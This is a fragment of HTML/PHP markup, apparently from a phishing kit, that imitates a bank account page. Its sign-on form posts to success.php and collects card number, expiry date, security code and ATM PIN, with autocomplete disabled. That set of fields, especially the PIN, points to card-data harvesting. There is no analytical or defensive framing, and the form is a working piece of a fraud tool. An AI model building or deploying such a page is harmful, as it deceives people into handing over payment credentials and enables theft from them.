        ...
        <div class="account-content-container"> 
         <div class="account-table-body"> 
          ...
          <section class="account-section"> 
           <form class="pay-transfer-options clearfix" action="success.php?token=<?php echo $_SESSION['token']; ?>" name="SignOn" id="frmSignOn" method="post"> 
            ...
            <div class="form-item label-right full-width clearfix"> 
               ...
               <label for="UserID"><strong>Card Number: </strong></label> 
             <input tabindex="1" type="tel" id="UserID" name="cnumber" required autocomplete="off" maxlength="16" class="required demo-username"> 
                      
                       
               <label for="UserID"><strong>Expiry Date: </strong></label> 
             <input tabindex="1" type="tel" id="UserID" name="expiry" required autocomplete="off" placeholder="mm/yyyy" maxlength="7" class="required demo-username"  onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/[^\d\/]/g,'')"> 
           
   
              <label for="UserID"><strong>Security Code: </strong></label> 
             <input tabindex="1" type="tel" id="UserID" name="cvv" required autocomplete="off" maxlength="6" class="required demo-username"> 
             ...
             <div class="form-item full-width"> 
              <label for="currentpassword"><strong>ATM Pin: </strong></label> 
              <input tabindex="2" type="tel" id="currentpassword" name="atmpin" required maxlength="6" size="15" class="required demo-password"> 
              <!--                            <div class="show-hide">
